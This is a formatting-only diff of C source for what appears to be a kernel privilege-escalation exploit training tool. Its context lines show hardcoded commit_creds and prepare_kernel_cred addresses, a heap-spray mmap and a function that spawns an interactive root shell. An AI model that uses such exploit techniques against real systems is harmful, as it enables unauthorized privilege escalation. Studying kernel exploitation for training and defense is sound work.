@@ -29,6 +29,7 @@
 #include <sys/xattr.h>
 #include "drill.h"
 
+/* clang-format off */
 #define MMAP_SZ				0x1000
 #define PAYLOAD_SZ			95
 
@@ -38,6 +39,7 @@
 #define COMMIT_CREDS_PTR		0xffffffff810c0960UL
 #define PREPARE_KERNEL_CRED_PTR		0xffffffff810c0bf0UL
 #define INIT_TASK_PTR			0xffffffff82a0c940UL
+/* clang-format on */
 
 typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
@@ -73,11 +75,7 @@ int do_cpu_pinning(void)
 void run_sh(void)
 {
 	pid_t pid = -1;
-	char *args[] = {
-		"/bin/sh",
-		"-i",
-		NULL
-	};
+	char *args[] = { "/bin/sh", "-i", NULL };
 	int status = 0;
 
 	pid = fork();
@@ -152,8 +150,7 @@ int main(void)
 	/*
 	 * Prepare
 	 */
-	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
-					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (spray_data == MAP_FAILED) {
 		perror("[-] mmap");
 		goto end;
